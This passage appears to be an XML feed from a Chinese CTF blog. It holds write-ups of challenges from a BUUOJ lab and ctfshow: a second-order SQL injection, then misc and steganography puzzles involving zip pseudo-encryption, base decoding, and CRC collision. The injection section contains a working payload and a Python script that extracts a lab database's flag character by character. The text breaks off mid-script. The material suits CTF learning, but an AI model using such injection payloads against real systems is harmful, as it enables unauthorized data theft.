        <content type="html"><![CDATA[<h3 id="二次注入？"><a href="#二次注入？" class="headerlink" title="二次注入？"></a>二次注入？</h3><p>开始给了一个登录的页面，emmm，猜测register.php(当然你也可以扫一下)，注册之后登陆然后进入主页，主页有用户名，判断有二次注入，算是半拉盲注？然后可以测试一下单引号，双引号，然后就是单引号闭合，emmm过滤了<code>,</code>可以用下面的语句注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+ascii(substr((database()) from &quot; + str(i) + &quot; for 1))+&#x27;</span><br></pre></td></tr></table></figure><p>emmm，表名要猜？！！好家伙，我也不会，贴下俺根据wp写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------.</span></span><br><span class="line"><span class="comment"># @Author  : M4XLMUM                                  |</span></span><br><span class="line"><span class="comment"># @website : http://a16n.github.io or http://a16ne.cn |</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database</span>(<span class="params">username, email</span>):</span><br><span class="line">    <span class="comment"># 注册部分</span></span><br><span class="line">    url = <span class="string">&quot;http://c20af613-209f-4645-b6fa-a362921f30fc.node3.buuoj.cn/&quot;</span></span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url + <span class="string">&quot;register.php&quot;</span>, register_data)</span><br><span class="line">    register_text = response.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 登陆部分</span></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    login_response = requests.post(url + <span class="string">&quot;login.php&quot;</span>, login_data)</span><br><span class="line">    login_text = login_response.text</span><br><span class="line">    soup = BeautifulSoup(login_text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    get_username = soup.find_all(<span class="string">&#x27;span&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    sql_username = get_username.text</span><br><span class="line">    sql_username = <span class="built_in">str</span>.strip(sql_username)  <span class="comment"># 获取index页面的用户名</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(sql_username) != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">int</span>(sql_username))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">str_database = &#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(1, 10):</span></span><br><span class="line"><span class="string">    username = &quot;0&#x27;+ascii(substr((database()) from &quot; + str(i) + &quot; for 1))+&#x27;0&quot;</span></span><br><span class="line"><span class="string">    email = str(i) + &quot;13@qq.com&quot;</span></span><br><span class="line"><span class="string">    if get_database(username, email) != 0:</span></span><br><span class="line"><span class="string">        str_database += get_database(username, email)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">print(str_database)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">str_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    username = <span class="string">&quot;&#x27;+ascii(substr((select * from flag) from &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot; for 1))+&#x27;&quot;</span></span><br><span class="line">    email = <span class="built_in">str</span>(i) + <span class="string">&quot;16@qq.com&quot;</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> get_database(username, email) != <span class="number">0</span>:</span><br><span class="line">        str_flag += get_database(username, email)</span><br><span class="line">        <span class="built_in">print</span>(str_flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意那个email经过一次测试要换一下字符串里的内容，emmm要不查出来的用户名还是那个用户名。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow之misc题目练习</title>
      <link href="/2021/02/24/ctfshow%E4%B9%8Bmisc%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/02/24/ctfshow%E4%B9%8Bmisc%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><p>伪加密，倒数第二个PK后的09 00 改为 00 00即可<br><code>flag&#123;79ddfa61bda03defa7bfd8d702a656e4&#125;</code></p><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>打开压缩包是名为file的文件，没有文件后缀名，直接用记事本打开看到文件头部分有个FAT，查了百度之后是MS-DOS的文件配置表？然后提示<code>偶然发现我竟然还有个软盘，勾起了我的回忆。</code>，呼呼，用vmware添加一个虚拟机（不添加iso文件的那种），添加软盘驱动器，使用的软盘映像文件就是刚才解压出来的file文件，打开虚拟机后就显示出了flag:::<code>flag&#123;ctfshow&#125;</code></p><h3 id="miscx"><a href="#miscx" class="headerlink" title="miscx"></a>miscx</h3><p>misc1.zip文件没有加密，拉出来。<br>然后misc1文件里面还是有一个加密了，一个图片没有加密，把图片拉出来看一看。<br>图片上面是2020，猜测为misc1.zip文件的密码，借此将misc1文件里面的那个文件(music.docx)拉出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭‖♭‖‖♯♭♭♬‖♩♫‖♬∮♭♭¶♭‖♯‖¶♭♭‖∮‖‖♭‖§♭‖♬♪♭♯§‖‖♯‖‖♬‖‖♪‖‖♪‖¶§‖‖♬♭♯‖♭♯♪‖‖∮‖♬§♭‖‖‖♩♪‖‖♬♭♭♬‖♩♪‖♩¶‖♩♪‖♩♬‖¶§‖‖♩‖¶♫♭♭♩‖♬♯‖♬§♭‖♭‖♩¶‖‖∮♭♭♬‖‖♭‖♫§‖¶♫‖♩∮♭♭§‖♭§‖♭§§=</span><br></pre></td></tr></table></figure><p>音符加密，以前做题的时候遇到过，解密后为<code>U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</code><br>Rabbit在线解密后为<code>welcome_to_payhelp</code>，—秘钥为<code>2020</code><br>上面的那个就是misc2文件的密码，直接解压misc2.zip文件。<br>Hint.txt文件里面的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VmpKMFUxTXhXWGxVV0dob1RUSjRVVll3V2t0aFJscDBZMGhLYTAxWGVIaFZiRkpUWWtaYVZWSnJXbFpOVjJoeVZYcEdZVkpzVG5KVWJHaHBWa1ZWZDFkV1ZtRmtNRFZYVjJ4c2FWSlVWbFJVVnpWdVRXeFZlV1ZHVGxSaVZrWTBXVlJPYzFWR1pFZFRiVGxYWW01Q1dGcEdXbE5UUjBZMlVXMTBWMWRGU2xkV1ZtUXdVekpGZUZOWWJHaFRSVFZWV1d0YVMxTXhjRVZUYTFwc1ZteHdlRlp0ZERCV01VcFlaRE53V0Zac2NIWldSekZMVW1zeFdWSnNTbWxXUjNodlZtMXdUMkl5Vm5OaVNGWnBVbXh3YzFac1VrZFNiRlY0WVVkMFZXSlZXbmxWYlRWUFZsWlplbEZyWkZSaVJrcFFWV3hGYkUwd1VXeE5NRkVsTTBRJTNE</span><br></pre></td></tr></table></figure><p>BASE64解密，<code>welcome_to_2020%0Aflag%20is%20coming...%0Athe%20key%20is%20hello%202020%21</code>URLdecode得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome_to_2020</span><br><span class="line">flag is coming...</span><br><span class="line">the key is hello 2020!</span><br></pre></td></tr></table></figure><p>所以另一个文件flag.txt的密码为<code>hello 2020!</code><br>解压出文件得flag:::<code>flag&#123;g00d_f0r_y0u&#125;</code></p><h3 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h3><p>压缩包里面是一张图片，里面估计是藏的有东西，那就用foremost分离出来。<br>分离出来了一个rar文件和一张图片，rar里面是一个flag.zip的文件，有密码，试试ziperello这个软件看看有没有密码。<br>是真加密了，直接爆破得密码为<code>123456</code>，解压出文件，里面一堆数字，估计又要写脚本。<br>再看png，用一下strings命令得出一段base加密后的字符串<code>Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</code>，一个64，一个32之后得<code>KEY&#123;Lazy_Man&#125;</code><br>。。。然后就是那么多数字了，转成十六进制文件，这这这。。。下面这是网上的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">number = read_file(<span class="string">&#x27;thienc.txt&#x27;</span>)</span><br><span class="line">result = []</span><br><span class="line">result.append(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, number))</span><br><span class="line">result = result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">strings =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    y = <span class="built_in">bytearray</span>.fromhex(i)</span><br><span class="line">    z = <span class="built_in">str</span>(y)</span><br><span class="line">    z= re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,z)[<span class="number">0</span>]</span><br><span class="line">    strings += z</span><br><span class="line"></span><br><span class="line">b= strings.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strings=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(i) ==<span class="number">1</span>:</span><br><span class="line">        i= <span class="string">&#x27;0&#x27;</span> + i</span><br><span class="line">    strings +=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strings)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;complete！&quot;</span>)</span><br></pre></td></tr></table></figure><p>总之就是十进制-&gt;十六进制-&gt;ascii-&gt;去掉<code>0x</code>-&gt;写入文件<br>7z文件还有加密，密码为<code>KEY&#123;Lazy_Man&#125;</code><br>抄网上的base脚本解下文件内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 算法逆向破解</span></span><br><span class="line"><span class="comment"># 加密函数，flag是某个字符串</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">flag</span>):</span><br><span class="line">    bcode = &#123;</span><br><span class="line">        <span class="string">&#x27;16&#x27;</span>: <span class="keyword">lambda</span> x: base64.b16encode(x),  <span class="comment"># 使用lambda表达式对x进行base64编码</span></span><br><span class="line">        <span class="string">&#x27;32&#x27;</span>: <span class="keyword">lambda</span> x: base64.b32encode(x),</span><br><span class="line">        <span class="string">&#x27;64&#x27;</span>: <span class="keyword">lambda</span> x: base64.b64encode(x)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 字符串在Python内部的表示是unicode编码</span></span><br><span class="line">    <span class="comment"># 因此，在做编码转换时，通常需要以unicode作为中间编码，即先将其他编码的字符串解码（decode）成unicode，再从unicode编码（encode）成另一种编码。</span></span><br><span class="line">    msg = flag.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># encode的作用是将unicode编码转换成其他编码的字符串</span></span><br><span class="line">    <span class="comment"># 加密过程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        order = random.choice([<span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;16&#x27;</span>])</span><br><span class="line">        msg = bcode[order](msg)</span><br><span class="line">        <span class="comment"># print(&#x27;&#123;&#125;:&#123;&#125;&#x27;.format(order, msg))</span></span><br><span class="line"></span><br><span class="line">    msg = msg.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># decode的作用是将其他编码的字符串转换成unicode编码</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipherText = <span class="built_in">open</span>(<span class="string">&quot;secenc.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()     <span class="comment">#= enc(&quot;flag&#123;****some secret****&#125;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密文是：&quot;</span>, cipherText)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据base16,32,64之间的编码形式不同进行破解</span></span><br><span class="line"><span class="comment"># Base64：</span></span><br><span class="line"><span class="comment"># 包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+/，&quot;=&quot;个数的取值范围为&#123;0,1,2&#125;;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Base32:</span></span><br><span class="line"><span class="comment"># 而Base32中只有大写字母（A-Z）和数字234567，&quot;=&quot;个数的取值范围为&#123;0,1,3,4,6&#125;；</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Base16:</span></span><br><span class="line"><span class="comment"># 而Base16就是16进制，他的范围是数字(0-9)，字母（ABCDEF）；</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dcode = [lambda x: base64.b16decode(x), lambda x: base64.b32decode(x), lambda x: base64.b64decode(x)]</span></span><br><span class="line">base64Patter = re.<span class="built_in">compile</span>(<span class="string">&#x27;[A-Za-z0-9+/]&#x27;</span>)</span><br><span class="line">base32Patter = re.<span class="built_in">compile</span>(<span class="string">&#x27;[^A-Z2-7]&#x27;</span>)</span><br><span class="line">base16Patter = re.<span class="built_in">compile</span>(<span class="string">&#x27;[^G-Z]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># findall可以获取字符串中所有匹配的字符串，返回一个列表。</span></span><br><span class="line"><span class="comment"># results = re.findall(p,source)</span></span><br><span class="line"><span class="comment"># print(results)</span></span><br><span class="line"></span><br><span class="line">dcode = &#123;</span><br><span class="line">    <span class="string">&#x27;16&#x27;</span>: <span class="keyword">lambda</span> x: base64.b16decode(x),  <span class="comment"># 使用lambda表达式对x进行base64编码</span></span><br><span class="line">    <span class="string">&#x27;32&#x27;</span>: <span class="keyword">lambda</span> x: base64.b32decode(x),</span><br><span class="line">    <span class="string">&#x27;64&#x27;</span>: <span class="keyword">lambda</span> x: base64.b64decode(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg = cipherText.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># text = &#x27;GHIL&#x27;.encode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="comment"># if re.search(b&#x27;[^G-Z]&#x27;, text) != None:   # 不要G-Z</span></span><br><span class="line"><span class="comment">#     print(&#x27;符合要求&#x27;)</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     print(&quot;不符合要求&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">b&#x27;.*[a-z].*&#x27;</span>, msg) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  <span class="comment"># 包含a-z，只有base64</span></span><br><span class="line">        msg = dcode[<span class="string">&#x27;64&#x27;</span>](msg)</span><br><span class="line">    <span class="keyword">elif</span> re.match(<span class="string">b&#x27;.*[G-Z].*&#x27;</span>, msg) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  <span class="comment"># base16编码中没有G-Z，如果编码中有G-Z，说明是base32</span></span><br><span class="line">        msg = dcode[<span class="string">&#x27;32&#x27;</span>](msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg = dcode[<span class="string">&#x27;16&#x27;</span>](msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文是：&quot;</span>, msg.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>base64与base32混合解密。<br>得出来<code>?!.</code>的混合，是Ook!然后brainfuck解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_tO_cTf_3how!&#125;</span><br></pre></td></tr></table></figure><p>太强了。。。</p><h3 id="misc30之一"><a href="#misc30之一" class="headerlink" title="misc30之一"></a>misc30之一</h3><p>1.这里给一个rar的文件，改文件名为1.rar，拉出来星空.jpg，详细信息有解压密码<code>little stars</code>，解压出了doc文档。<br>2.全选内容，字体颜色改为蓝色发现提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你知道梵高的星空吗？</span><br><span class="line">Hello friend!</span><br></pre></td></tr></table></figure><p>密码就是英文的这些，再解压得<br>3.拉出来flag.png，扫码<code>flag&#123;welcome_to_ctfshow&#125;</code></p><h3 id="stega1"><a href="#stega1" class="headerlink" title="stega1"></a>stega1</h3><p>1.用jphs_seek没密码<code>flag&#123;3c87fb959e5910b40a04e0491bf230fb&#125;</code></p><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">密文：zse4rfvsdf 6yjmko0</span><br><span class="line"></span><br><span class="line">提示1：解密后两个字符,小写 提示2：看看自己下面</span><br><span class="line"></span><br><span class="line">提交flag&#123;明文&#125;</span><br></pre></td></tr></table></figure><p>看看下面，哦，原来是键盘，我还以为是…<br><code>flag&#123;av&#125;</code></p><h3 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h3><p>二维码扫一下<code>flag不在这里哦~~</code>，用winhex打开发现文件尾有一串brainfuck解密后得<code>和谐民主和谐文明和谐和谐和谐自由和谐平等和谐公正</code>，再解一下社会主义核心价值观编码<code>123456</code>，解出来应该是mp3stego得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint：静默之眼</span><br><span class="line">对了~另一个音乐的密码是abc123哦</span><br><span class="line">你马上就成功了！</span><br></pre></td></tr></table></figure><p>解压出另一个音乐文件。提示silenteye，是另一种加密，下载软件silenteye。<br>另一个线索<code>110001010100011101</code>转为十进制为<code>202013</code>，是wav的密码。<br>解密得flag，AES128，202013得<code>flag&#123;C0ngr4tul4ti0n!&#125;</code></p><h3 id="misc30之二"><a href="#misc30之二" class="headerlink" title="misc30之二"></a>misc30之二</h3><p>伪加密解出来音频，有一张图片，foremost分离出来，修改高度发现信息。高度可以将图片的宽高转为十六进制再在winhex下面查找一下<code>01 73 03 7F</code>，找到后修改下获得猪圈密码<code>01 改为 02 即可</code>。<br><a href="http://ctf.ssleye.com/pigpen.html">这个网站还算好用</a><br><code>flag&#123;well done&#125;</code></p><h3 id="红包题第一弹"><a href="#红包题第一弹" class="headerlink" title="红包题第一弹"></a>红包题第一弹</h3><p>解压出来86张照片，每张图片的文件尾的<code>;</code>之后都有一段是base64的片段，写个脚本提取一下，放在一个txt文件内，下面是自己写的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:         1</span></span><br><span class="line"><span class="comment"># Description:  </span></span><br><span class="line"><span class="comment"># Author:       M4XLMUM</span></span><br><span class="line"><span class="comment"># Date:         2021/3/6</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line">        content = content[<span class="built_in">len</span>(content) - <span class="number">100</span>:<span class="built_in">len</span>(content)]</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">87</span>):</span><br><span class="line">    jpg = <span class="built_in">str</span>(i) + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">    file.write(extract(jpg))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;successful!&#x27;</span>)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>然后base64转图片获得二维码，扫描得flag。<br><code>flag&#123;gif_is_so_easy&#125;</code></p><h3 id="stega10"><a href="#stega10" class="headerlink" title="stega10"></a>stega10</h3><p>heart里面有一段base64，解码后是一个zip的链接，下载后里面有密码(未加密)和n.zip(加密)，密码目录下有加密的密码1-9.txt文件，每个文件占一个字节，crc碰撞，下面是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:         CrcCrash</span></span><br><span class="line"><span class="comment"># Description:  for txt file to crash crc</span></span><br><span class="line"><span class="comment"># Author:       M4XLMUM</span></span><br><span class="line"><span class="comment"># Date:         2021/3/7</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">dic = string.printable   <span class="comment">#猜测文件内容的字典</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getCrc</span>():</span><br><span class="line">    <span class="built_in">zip</span> = zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    zip_list = <span class="built_in">zip</span>.namelist()</span><br><span class="line">    crclist = []</span><br><span class="line">    <span class="keyword">for</span> txt <span class="keyword">in</span> zip_list:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;.txt&#x27;</span> <span class="keyword">in</span> txt:</span><br><span class="line">            crclist.append(<span class="built_in">zip</span>.getinfo(txt).CRC)</span><br><span 